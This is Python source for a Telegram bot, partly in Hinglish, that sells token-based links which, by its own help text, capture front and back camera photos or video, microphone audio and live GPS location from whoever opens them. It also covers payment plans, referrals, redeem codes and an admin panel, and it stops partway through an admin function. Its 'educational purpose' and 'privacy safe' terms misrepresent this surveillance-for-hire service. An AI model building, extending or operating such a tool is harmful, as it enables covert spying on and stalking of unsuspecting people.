import io
import html
import json
import os
import random
import string
import threading
import time
import uuid
from decimal import Decimal, ROUND_HALF_UP
from urllib.parse import urlencode
from datetime import datetime, timedelta
from flask import Flask, request, render_template, jsonify
from PIL import Image, ImageDraw
import qrcode
import telebot
from telebot import types

# ----------------- 1. CONFIG -----------------
with open("config.json", "r") as f:
    config = json.load(f)

BOT_TOKEN      = config.get("bot_token")
ADMIN_ID       = int(config.get("admin_id"))
OWNER_USERNAME = config.get("owner_username")
SERVER_URL     = config.get("server_url")
CHANNELS       = config.get("channels", [])
GROUP          = config.get("group", {})

DEV_TAG = f"👨‍💻 Developer: @{OWNER_USERNAME}"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

# ----------------- 2. DM-ONLY WRAPPER -----------------
_orig = bot.message_handler

def _dm_only(*args, **kwargs):
    def deco(func):
        def wrapped(msg, *a, **kw):
            if msg.chat.type != "private":
                return
            if int(msg.from_user.id) != ADMIN_ID:
                db = load_db()
                user_data = db.get("users", {}).get(str(msg.from_user.id), {})
                if db.get("settings", {}).get("maintenance", False):
                    bot.send_message(msg.chat.id,
                        f"<blockquote>🔧 <b>Bot maintenance mein hai.</b>\nPlease thodi der baad try karein.\n{DEV_TAG}</blockquote>")
                    return
                if user_data.get("banned"):
                    bot.send_message(msg.chat.id,
                        f"<blockquote>🚫 Aapka access disabled hai.\nContact: @{OWNER_USERNAME}</blockquote>")
                    return
            return func(msg, *a, **kw)
        return _orig(*args, **kwargs)(wrapped)
    return deco

bot.message_handler = _dm_only

# ----------------- 3. COLORFUL BUTTON HELPER -----------------
def kbtn(text, style=None):
    try:
        if style:
            return types.KeyboardButton(text, style=style)
        return types.KeyboardButton(text)
    except TypeError:
        b = types.KeyboardButton(text)
        if style:
            setattr(b, "style", style)
        return b

# ---------- MAIN MENU (USER) ----------
BTN_CAMERA    = "〖 ಠ〗𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_AUDIO     = "♫︎  𝐀𝐮𝐝𝐢𝐨"
BTN_LOCATION  = "༆ 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_PRICE     = "𝐏𝐫𝐢𝐜𝐞 ?"
BTN_BUY       = "💳 DIRECT BUY – 5% OFF"
BTN_REDEEM    = "✍︎ 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞"
BTN_BALANCE   = "✔︎ 𝐌𝐲 𝐁𝐚𝐥𝐚𝐧𝐜𝐞"
BTN_PAGE      = "𖠌 𝐏𝐞𝐠𝐞"
BTN_ADMIN     = "♕︎ 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐧𝐞𝐥"

# ---------- CAMERA ----------
BTN_FRONT_CAM = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_BACK_CAM  = "〖 ಠ〗𝐁𝐚𝐜𝐤 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_FRONT_VID = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_VID  = "〖 ಠ〗𝐁𝐚𝐜𝐤 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_HOME = "⌫  𝐁𝐚𝐜𝐤 𝐓𝐨 𝐇𝐨𝐦𝐞"

# ---------- USER EXTRA ----------
BTN_HISTORY   = "📜 𝐌𝐲 𝐇𝐢𝐬𝐭𝐨𝐫𝐲"
BTN_REFER     = "🔗 𝐑𝐞𝐟𝐞𝐫 & 𝐄𝐚𝐫𝐧"
BTN_PROFILE   = "👤 𝐌𝐲 𝐏𝐫𝐨𝐟𝐢𝐥𝐞"
BTN_LEADER    = "🏆 𝐋𝐞𝐚𝐝𝐞𝐫𝐛𝐨𝐚𝐫𝐝"
BTN_HELP      = "🆘 𝐇𝐞𝐥𝐩"
BTN_TERMS     = "📄 𝐓𝐞𝐫𝐦𝐬"
BTN_FAQ       = "❓ 𝐅𝐀𝐐"
BTN_FEEDBACK  = "💬 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤"

# ---------- ADMIN ----------
BTN_GEN_REDEEM    = "✍︎ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐑𝐞𝐝𝐞𝐞𝐦"
BTN_USER_ACTIVITY = "㋛︎ 𝐔𝐬𝐞𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲"
BTN_USER_PLAN     = "シ︎ 𝐔𝐬𝐞𝐫 𝐏𝐥𝐚𝐧"
BTN_ACTIVATE_PLAN = "✈︎ 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐏𝐥𝐚𝐧"
BTN_ADD_ALL       = "➕ 𝐀𝐝𝐝 𝐀𝐥𝐥 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_DEDUCT_ALL    = "➖ 𝐃𝐞𝐝𝐮𝐜𝐭 𝐀𝐥𝐥 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_ADD_ONE       = "👤 𝐀𝐝𝐝 𝟏 𝐔𝐬𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_DEDUCT_ONE    = "🗑 𝐃𝐞𝐝𝐮𝐜𝐭 𝟏 𝐔𝐬𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭"
BTN_CHECK_USER    = "🔍 𝐂𝐡𝐞𝐜𝐤 𝐔𝐬𝐞𝐫"
BTN_RESET_USER    = "♻️ 𝐑𝐞𝐬𝐞𝐭 𝐔𝐬𝐞𝐫"
BTN_CODES_LIST    = "🎟 𝐀𝐥𝐥 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞𝐬"
BTN_REVOKE_CODE   = "🗑 𝐑𝐞𝐯𝐨𝐤𝐞 𝐂𝐨𝐝𝐞"
BTN_STATS         = "📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐬"
BTN_BROADCAST     = "📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭"
BTN_BAN           = "🚫 𝐁𝐚𝐧 𝐔𝐬𝐞𝐫"
BTN_UNBAN         = "✅ 𝐔𝐧𝐛𝐚𝐧 𝐔𝐬𝐞𝐫"
BTN_SET_REF       = "⚙️ 𝐒𝐞𝐭 𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥"
BTN_MAINTENANCE   = "🔧 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞"
BTN_EXPORT_DB     = "📤 𝐄𝐱𝐩𝐨𝐫𝐭 𝐃𝐁"
BTN_MANAGE_PLANS  = "🛍 Manage Plans"
BTN_BACK_ADMIN    = "⌫ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐀𝐝𝐦𝐢𝐧"

# ----------------- PURCHASE CATALOG -----------------
DEFAULT_PLANS = {
    "tok5":  {"name": "5 Tokens", "kind": "tokens", "value": 5, "price": "10.00", "active": True},
    "tok10": {"name": "10 Tokens", "kind": "tokens", "value": 10, "price": "15.00", "active": True},
    "tok30": {"name": "30 Tokens", "kind": "tokens", "value": 30, "price": "55.00", "active": True},
    "tok100":{"name": "100 Tokens", "kind": "tokens", "value": 100, "price": "80.00", "active": True},
    "vip3":  {"name": "VIP 3 Days", "kind": "vip", "value": 3, "price": "30.00", "active": True},
    "vip7":  {"name": "VIP 7 Days", "kind": "vip", "value": 7, "price": "60.00", "active": True},
    "vip30": {"name": "VIP 30 Days", "kind": "vip", "value": 30, "price": "200.00", "active": True},
}
UPI_ID = "ayush.sharma798@fam"
DISCOUNT_RATE = Decimal("0.05")

# ----------------- 4. DATABASE -----------------
def load_db():
    try:
        with open("database.json", "r") as f:
            db = json.load(f)
    except Exception:
        db = {}
    db.setdefault("users", {})
    db.setdefault("redeem_codes", {})
    db.setdefault("settings", {"maintenance": False, "referral_credits": 2})
    db.setdefault("plans", DEFAULT_PLANS.copy())
    db.setdefault("pending_orders", {})
    db.setdefault("feedback_map", {})
    return db

def save_db(db):
    with open("database.json", "w") as f:
        json.dump(db, f, indent=4)

def _add_history(user, action, amount):
    user.setdefault("history", []).append({
        "action": action, "amount": amount,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    user["history"] = user["history"][-50:]

def get_user_data(user):
    db = load_db()
    uid = str(user.id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "tokens": 0, "plan": "free", "expiry": None,
            "username": f"@{user.username}" if user.username else "N/A",
            "name": user.first_name, "history": [],
            "referred_by": None, "referrals": [],
            "banned": False,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_db(db)
    u = db["users"][uid]
    for k, v in {"history": [], "referrals": [], "banned": False,
                 "referred_by": None, "joined": "N/A"}.items():
        u.setdefault(k, v)
    return u

def has_active_plan(uid):
    if int(uid) == ADMIN_ID:
        return True
    db = load_db()
    u = db["users"].get(str(uid))
    if not u or u.get("banned"):
        return False
    if u.get("plan") == "unlimited":
        if u.get("expiry") is None:
            return True
        if datetime.now() < datetime.strptime(u["expiry"], "%Y-%m-%d %H:%M:%S"):
            return True
    return u.get("tokens", 0) > 0

def deduct_token(uid):
    if int(uid) == ADMIN_ID:
        return
    db = load_db()
    u = db["users"].get(str(uid))
    if u:
        active_vip = False
        if u.get("plan") == "unlimited":
            expiry = u.get("expiry")
            if not expiry:
                active_vip = True
            else:
                try:
                    active_vip = datetime.now() < datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                except (TypeError, ValueError):
                    active_vip = False
        if not active_vip:
            u["tokens"] = max(0, int(u.get("tokens", 0)) - 1)
            _add_history(u, "media_use", -1)
            if u.get("plan") == "unlimited":
                u["plan"] = "free"
                u["expiry"] = None
            save_db(db)

# ----------------- 5. KEYBOARDS -----------------
def get_main_menu(user_id):
    """Main menu: Camera → Audio → Location top pe, fir baaki buttons"""
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    # 🔝 Top 3 buttons
    m.add(kbtn(BTN_CAMERA, "primary"), kbtn(BTN_AUDIO, "primary"))
    m.add(kbtn(BTN_LOCATION, "primary"), kbtn(BTN_PRICE, "success"))
    # Baaki buttons
    m.add(kbtn(BTN_BUY, "success"), kbtn(BTN_REDEEM, "primary"))
    m.add(kbtn(BTN_BALANCE, "success"), kbtn(BTN_HISTORY, "primary"))
    m.add(kbtn(BTN_REFER, "primary"), kbtn(BTN_PROFILE, "primary"))
    m.add(kbtn(BTN_LEADER, "primary"), kbtn(BTN_HELP, "primary"))
    m.add(kbtn(BTN_TERMS, "primary"), kbtn(BTN_FAQ, "primary"))
    m.add(kbtn(BTN_FEEDBACK, "primary"))
    if int(user_id) == ADMIN_ID:
        m.add(kbtn(BTN_ADMIN, "danger"))
    return m

def get_camera_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_FRONT_CAM, "primary"), kbtn(BTN_BACK_CAM, "primary"))
    m.add(kbtn(BTN_FRONT_VID, "primary"), kbtn(BTN_BACK_VID, "primary"))
    m.add(kbtn(BTN_BACK_HOME, "danger"))
    return m

def get_admin_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn(BTN_GEN_REDEEM, "success"), kbtn(BTN_USER_ACTIVITY, "primary"))
    m.add(kbtn(BTN_USER_PLAN, "primary"), kbtn(BTN_ACTIVATE_PLAN, "primary"))
    m.add(kbtn(BTN_ADD_ALL, "success"), kbtn(BTN_DEDUCT_ALL, "danger"))
    m.add(kbtn(BTN_ADD_ONE, "success"), kbtn(BTN_DEDUCT_ONE, "danger"))
    m.add(kbtn(BTN_CHECK_USER, "primary"), kbtn(BTN_RESET_USER, "danger"))
    m.add(kbtn(BTN_CODES_LIST, "primary"), kbtn(BTN_REVOKE_CODE, "danger"))
    m.add(kbtn(BTN_STATS, "success"), kbtn(BTN_BROADCAST, "primary"))
    m.add(kbtn(BTN_BAN, "danger"), kbtn(BTN_UNBAN, "success"))
    m.add(kbtn(BTN_SET_REF, "primary"), kbtn(BTN_MAINTENANCE, "danger"))
    m.add(kbtn(BTN_EXPORT_DB, "primary"), kbtn(BTN_MANAGE_PLANS, "success"))
    m.add(kbtn(BTN_BACK_HOME, "danger"))
    return m

def get_redeem_type_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(kbtn("VIP", "success"), kbtn("Normal", "primary"))
    m.add(kbtn(BTN_BACK_ADMIN, "danger"))
    return m

# ----------------- 6. START -----------------
def make_circular_avatar(avatar_img, size=(130, 130), border_color="#2ECC71", border_width=5):
    avatar_img = avatar_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
    mask = Image.new("L", size, 0)
    draw_mask = ImageDraw.Draw(mask)
    draw_mask.ellipse((0, 0, size[0], size[1]), fill=255)
    circular = Image.new("RGBA", size, (0, 0, 0, 0))
    circular.paste(avatar_img, (0, 0), mask=mask)
    draw_border = ImageDraw.Draw(circular)
    draw_border.ellipse((border_width // 2, border_width // 2, size[0] - border_width // 2, size[1] - border_width // 2), outline=border_color, width=border_width)
    return circular

def send_home_dashboard(chat_id, user):
    get_user_data(user)
    bot_name = bot.get_me().first_name
    text = (
        f"<blockquote>Welcome to {bot_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Name : {user.first_name}\n"
        f"UID: {user.id}\n"
        f"Username: @{user.username if user.username else 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}</blockquote>"
    )
    markup = get_main_menu(user.id)
    user_photos = bot.get_user_profile_photos(user.id)

    try:
        banner = Image.open("banner.png").convert("RGBA")
        if user_photos.total_count > 0:
            file_id = user_photos.photos[0][-1].file_id
            file_info = bot.get_file(file_id)
            downloaded = bot.download_file(file_info.file_path)
            avatar = make_circular_avatar(Image.open(io.BytesIO(downloaded)))
            banner.paste(avatar, (30, 30), avatar)

        buf = io.BytesIO()
        banner.convert("RGB").save(buf, format="JPEG", quality=95)
        buf.seek(0)
        bot.send_photo(chat_id, photo=buf, caption=text, reply_markup=markup)
    except Exception as e:
        print("Banner Error:", e)
        bot.send_message(chat_id, text, reply_markup=markup)

@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.chat.type != "private":
        return
    user = message.from_user
    args = message.text.split()

    if len(args) > 1 and args[1].startswith("ref_"):
        referrer_id = args[1].replace("ref_", "").strip()
        if referrer_id.isdigit() and referrer_id != str(user.id):
            get_user_data(user)
            db = load_db()
            new_uid = str(user.id)
            if not db["users"][new_uid].get("referred_by"):
                ref_user = db["users"].get(referrer_id)
                if ref_user:
                    credits = db["settings"].get("referral_credits", 2)
                    ref_user["tokens"] = ref_user.get("tokens", 0) + credits
                    _add_history(ref_user, "referral_bonus", credits)
                    ref_user.setdefault("referrals", []).append(new_uid)
                    db["users"][new_uid]["referred_by"] = referrer_id
                    db["users"][new_uid]["tokens"] = db["users"][new_uid].get("tokens", 0) + credits
                    _add_history(db["users"][new_uid], "referred_bonus", credits)
                    save_db(db)
                    try:
                        bot.send_message(int(referrer_id),
                            f"<blockquote>🎉 <b>New Referral!</b>\n👤 {user.first_name}\n🪙 +{credits} tokens\n{DEV_TAG}</blockquote>")
                    except Exception:
                        pass

    send_home_dashboard(message.chat.id, user)

@bot.message_handler(func=lambda m: m.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"])
def go_home(m):
    send_home_dashboard(m.chat.id, m.from_user)

# ----------------- 7. BALANCE -----------------
@bot.message_handler(func=lambda m: m.text == BTN_BALANCE)
def my_balance(message):
    uid = str(message.from_user.id)
    db = load_db()
    user = db["users"].get(uid)
    if int(uid) == ADMIN_ID:
        bot.reply_to(message, f"<blockquote>Activate VIP Lifetime ✅\nToken : unlimited\n{DEV_TAG}</blockquote>")
        return
    if not user or user.get("banned"):
        bot.reply_to(message, f"<blockquote>Not activate VIP ❌\nToken : 0\n{DEV_TAG}</blockquote>")
        return
    if user.get("plan") == "unlimited" and user.get("expiry"):
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            d = max(1, (exp - datetime.now()).days + 1)
            bot.reply_to(message, f"<blockquote>Activate VIP {d}d ✅\nToken : unlimited\n{DEV_TAG}</blockquote>")
            return
    bot.reply_to(message, f"<blockquote>Not activate VIP ❌\nToken : {user.get('tokens',0)}\n{DEV_TAG}</blockquote>")

# ----------------- 8. PRICE -----------------
def send_price_menu(chat_id):
    db = load_db()
    lines = ["🛍 <b>Available Plans</b>", "━━━━━━━━━━━━━━━━━━━━"]
    for pid, plan in db.get("plans", DEFAULT_PLANS).items():
        if plan.get("active", True):
            unit = "tokens" if plan.get("kind") == "tokens" else "days VIP"
            lines.append(f"• {plan.get('name', pid)} — ₹{plan.get('price')} ({plan.get('value')} {unit})")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}")
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("💳 DIRECT BUY – 5% OFF", callback_data="buy_open"))
    bot.send_message(chat_id, "<blockquote>" + "\n".join(lines) + "</blockquote>", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text == BTN_PRICE)
def price_btn(m): send_price_menu(m.chat.id)

# ----------------- 9. CAMERA (WORKING) -----------------
@bot.message_handler(func=lambda m: m.text == BTN_CAMERA)
def camera_options(m):
    bot.send_message(m.chat.id,
        f"<blockquote>📷 <b>Camera Options:</b>\nSelect karein:\n{DEV_TAG}</blockquote>",
        reply_markup=get_camera_menu())

def _check_media_access(message):
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id,
            f"<blockquote>⚠️ <b>Koi subscription nahi hai</b>\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id)
        return False
    return True

def handle_media_request(message, endpoint, label):
    if not _check_media_access(message): return
    deduct_token(message.from_user.id)
    link = f"{SERVER_URL}/{endpoint}?chat_id={message.chat.id}"
    bot.send_message(message.chat.id,
        f"<blockquote>🔗 <b>{label} Link:</b>\n\n{link}\n\n"
        f"⚠️ Link open karke permission allow karein.\n{DEV_TAG}</blockquote>",
        disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_CAM)
def front_cam(m): handle_media_request(m, "Ayush-wab", "Front Camera")

@bot.message_handler(func=lambda m: m.text == BTN_BACK_CAM)
def back_cam(m): handle_media_request(m, "Ayush-wab-1", "Back Camera")

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_VID)
def front_vid(m): handle_media_request(m, "Ayush-wab-2", "Front 8s Video")

@bot.message_handler(func=lambda m: m.text == BTN_BACK_VID)
def back_vid(m): handle_media_request(m, "Ayush-wab-3", "Back 8s Video")

# ----------------- 10. AUDIO & LOCATION (WORKING) -----------------
@bot.message_handler(func=lambda m: m.text == BTN_AUDIO)
def audio_btn(m):
    if not _check_media_access(m): return
    deduct_token(m.from_user.id)
    link = f"{SERVER_URL}/Ayush-wab-4?chat_id={m.chat.id}"
    bot.send_message(m.chat.id,
        f"<blockquote>🔗 <b>Audio Link:</b>\n\n{link}\n\n⚠️ Mic allow karein.\n{DEV_TAG}</blockquote>",
        disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_LOCATION)
def location_btn(m):
    if not _check_media_access(m): return
    deduct_token(m.from_user.id)
    link = f"{SERVER_URL}/Ayush-wab-5?chat_id={m.chat.id}"
    bot.send_message(m.chat.id,
        f"<blockquote>🔗 <b>Location Link:</b>\n\n{link}\n\n⚠️ Location allow karein.\n{DEV_TAG}</blockquote>",
        disable_web_page_preview=True)

# ============ END OF PART 1 ============
# ============================================================
# ================= PART 2 — USER FEATURES ===================
# ============================================================

# ----------------- 11. HISTORY -----------------
@bot.message_handler(func=lambda m: m.text == BTN_HISTORY)
def my_history(message):
    db = load_db()
    user = db["users"].get(str(message.from_user.id))
    if not user:
        bot.reply_to(message, f"<blockquote>❌ No data.\n{DEV_TAG}</blockquote>")
        return
    hist = user.get("history", [])[-20:]
    if not hist:
        bot.reply_to(message, f"<blockquote>📜 Abhi koi history nahi.\n{DEV_TAG}</blockquote>")
        return
    text = f"<blockquote>📜 <b>Last {len(hist)} Transactions</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for h in reversed(hist):
        sign = "➕" if h.get("amount", 0) >= 0 else "➖"
        text += f"{sign} {h.get('action','?')}: <b>{abs(h.get('amount',0))}</b>\n   <i>{h.get('time','')}</i>\n"
    text += f"\n💰 Balance: <b>{user.get('tokens',0)}</b>\n{DEV_TAG}</blockquote>"
    bot.reply_to(message, text)

# ----------------- 12. REFER & EARN -----------------
@bot.message_handler(func=lambda m: m.text == BTN_REFER)
def refer_earn(message):
    uid = str(message.from_user.id)
    get_user_data(message.from_user)
    db = load_db()
    user = db["users"][uid]
    credits = db["settings"].get("referral_credits", 2)
    me = bot.get_me()
    ref_link = f"https://t.me/{me.username}?start=ref_{uid}"
    refs = len(user.get("referrals", []))

    text = (
        f"<blockquote>🔗 <b>Refer & Earn</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁 Har invite = <b>+{credits} tokens</b>\n"
        f"👥 Total Invited: <b>{refs}</b>\n"
        f"💰 Total Earned: <b>{refs * credits}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📤 <b>Your Link:</b>\n<code>{ref_link}</code>\n{DEV_TAG}</blockquote>"
    )
    mk = types.InlineKeyboardMarkup()
    share_url = f"https://t.me/share/url?url={ref_link}&text=Join+this+amazing+bot"
    mk.add(types.InlineKeyboardButton("📤 Share", url=share_url))
    bot.send_message(message.chat.id, text, reply_markup=mk, disable_web_page_preview=True)

# ----------------- 13. PROFILE -----------------
@bot.message_handler(func=lambda m: m.text == BTN_PROFILE)
def my_profile(message):
    uid = str(message.from_user.id)
    get_user_data(message.from_user)
    db = load_db()
    user = db["users"][uid]
    tokens = user.get("tokens", 0)

    tier = "🥉 Bronze"
    if tokens >= 500: tier = "🥇 Gold"
    elif tokens >= 100: tier = "🥈 Silver"

    text = (
        f"<blockquote>👤 <b>My Profile</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 Name: <b>{user.get('name','N/A')}</b>\n"
        f"🔗 Username: {user.get('username','N/A')}\n"
        f"🆔 UID: <code>{uid}</code>\n"
        f"🪙 Tokens: <b>{tokens}</b>\n"
        f"📦 Plan: <b>{user.get('plan','free')}</b>\n"
        f"⏳ Expiry: <b>{user.get('expiry') or 'N/A'}</b>\n"
        f"🏅 Tier: <b>{tier}</b>\n"
        f"👥 Referrals: <b>{len(user.get('referrals',[]))}</b>\n"
        f"📅 Joined: <b>{user.get('joined','N/A')}</b>\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

# ----------------- 14. LEADERBOARD -----------------
@bot.message_handler(func=lambda m: m.text == BTN_LEADER)
def leaderboard(message):
    db = load_db()
    users = sorted(db["users"].items(), key=lambda x: x[1].get("tokens", 0), reverse=True)[:10]
    text = "<blockquote>🏆 <b>Top 10 Users</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for i, (uid, u) in enumerate(users, 1):
        medal = {1: "🥇", 2: "🥈", 3: "🥉"}.get(i, f"{i}.")
        text += f"{medal} <b>{u.get('name','?')}</b> — {u.get('tokens',0)} 🪙\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.reply_to(message, text)

# ----------------- 15. HELP -----------------
@bot.message_handler(func=lambda m: m.text == BTN_HELP)
def help_btn(message):
    text = (
        f"<blockquote>🆘 <b>Help & Support</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📷 Camera: Front/Back link\n"
        f"🎙 Audio: Voice record link\n"
        f"📍 Location: Live GPS link\n"
        f"🔗 Refer: Invite karo, tokens pao\n"
        f"✍️ Redeem: Code lagao, token pao\n"
        f"💰 Price: Subscription plans\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💬 Support: @{OWNER_USERNAME}\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

# ----------------- 16. TERMS -----------------
@bot.message_handler(func=lambda m: m.text == BTN_TERMS)
def terms_btn(message):
    text = (
        f"<blockquote>📄 <b>Terms & Conditions</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ Galat use = permanent ban\n"
        f"2️⃣ Tokens non-refundable\n"
        f"3️⃣ Sirf educational purpose\n"
        f"4️⃣ Privacy 100% safe\n"
        f"5️⃣ Illegal activity allowed nahi\n"
        f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

# ----------------- 17. FAQ -----------------
@bot.message_handler(func=lambda m: m.text == BTN_FAQ)
def faq_btn(message):
    text = (
        f"<blockquote>❓ <b>FAQ</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Q:</b> Tokens kaise milenge?\n"
        f"<b>A:</b> Refer, Redeem, ya Purchase se\n\n"
        f"<b>Q:</b> VIP kaise?\n"
        f"<b>A:</b> Price button dabao\n\n"
        f"<b>Q:</b> Link kaam nahi kar raha?\n"
        f"<b>A:</b> Browser permissions allow karo\n\n"
        f"<b>Q:</b> Redeem invalid?\n"
        f"<b>A:</b> Spelling check karo ya code expire\n"
        f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

# ----------------- 18. FEEDBACK -----------------
@bot.message_handler(func=lambda m: m.text == BTN_FEEDBACK)
def feedback_start(message):
    msg = bot.send_message(message.chat.id,
        f"<blockquote>💬 <b>Feedback</b>\nApna message likhein:\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, feedback_send)

def feedback_send(message):
    if not message.text or message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        send_home_dashboard(message.chat.id, message.from_user)
        return
    try:
        sent = bot.send_message(ADMIN_ID,
            f"<blockquote>💬 <b>New Feedback</b>\n👤 {html.escape(message.from_user.first_name or 'User')}\n"
            f"🆔 <code>{message.from_user.id}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"{html.escape(message.text)}\n\n↩️ Is message par Reply karke user ko jawab dein.\n{DEV_TAG}</blockquote>")
        db = load_db()
        db.setdefault("feedback_map", {})[str(sent.message_id)] = str(message.from_user.id)
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ <b>Feedback admin ko bhej diya.</b>\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>❌ Feedback send nahi hua.\n{DEV_TAG}</blockquote>")

# ----------------- 19. USER REDEEM -----------------
@bot.message_handler(func=lambda m: m.text == BTN_REDEEM)
def ask_redeem_code(message):
    msg = bot.send_message(message.chat.id,
        f"<blockquote>✍️ <b>Redeem Code</b>\nApna code bhejein:\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, process_redeem_input)

def process_redeem_input(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION,
           BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN,
           BTN_HISTORY, BTN_REFER, BTN_PROFILE, BTN_LEADER,
           BTN_HELP, BTN_TERMS, BTN_FAQ, BTN_FEEDBACK, "Back to home"]
    if message.text in nav:
        send_home_dashboard(message.chat.id, message.from_user)
        return

    code = message.text.strip().upper()
    db = load_db()

    if code not in db.get("redeem_codes", {}):
        bot.reply_to(message, f"<blockquote>❌ <b>Invalid Code!</b>\n{DEV_TAG}</blockquote>")
        return

    rc = db["redeem_codes"][code]

    if rc.get("expiry"):
        try:
            if datetime.now() > datetime.strptime(rc["expiry"], "%Y-%m-%d"):
                bot.reply_to(message, f"<blockquote>❌ Code expired!\n{DEV_TAG}</blockquote>")
                return
        except Exception:
            pass

    rc.setdefault("used_by", [])
    uid = str(message.from_user.id)

    if uid in rc["used_by"]:
        bot.reply_to(message, f"<blockquote>❌ Aap ye code pehle use kar chuke!\n{DEV_TAG}</blockquote>")
        return

    if rc.get("uses_left", 0) <= 0:
        bot.reply_to(message, f"<blockquote>❌ Code expired!\n{DEV_TAG}</blockquote>")
        return

    get_user_data(message.from_user)
    db = load_db()
    user = db["users"][uid]

    if rc["type"] == "token":
        tokens_added = rc["value"]
        user["tokens"] = user.get("tokens", 0) + tokens_added
        _add_history(user, "redeem_token", tokens_added)
        res = f"✅ <b>{tokens_added} tokens added!</b>"
    else:
        days_added = rc["days"]
        user["plan"] = "unlimited"
        user["expiry"] = (datetime.now() + timedelta(days=days_added)).strftime("%Y-%m-%d %H:%M:%S")
        _add_history(user, f"redeem_vip_{days_added}d", 0)
        res = f"👑 <b>VIP {days_added} days!</b>"

    rc["used_by"].append(uid)
    rc["uses_left"] -= 1
    if rc["uses_left"] <= 0:
        del db["redeem_codes"][code]
    save_db(db)

    bot.reply_to(message,
        f"<blockquote>{res}\n💰 Balance: <b>{user.get('tokens',0)}</b>\n{DEV_TAG}</blockquote>")

# ============================================================
# ==================== 20. ADMIN PANEL =======================
# ============================================================

def _is_admin(uid):
    return int(uid) == ADMIN_ID

@bot.message_handler(func=lambda m: m.text == BTN_ADMIN)
def admin_panel_open(message):
    if not _is_admin(message.from_user.id):
        return
    bot.send_message(message.chat.id,
        f"<blockquote>⚙️ <b>Admin Panel</b>\nSelect option:\n{DEV_TAG}</blockquote>",
        reply_markup=get_admin_menu())

# ----- 20.1 User Activity -----
@bot.message_handler(func=lambda m: m.text == BTN_USER_ACTIVITY)
def admin_user_activity(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
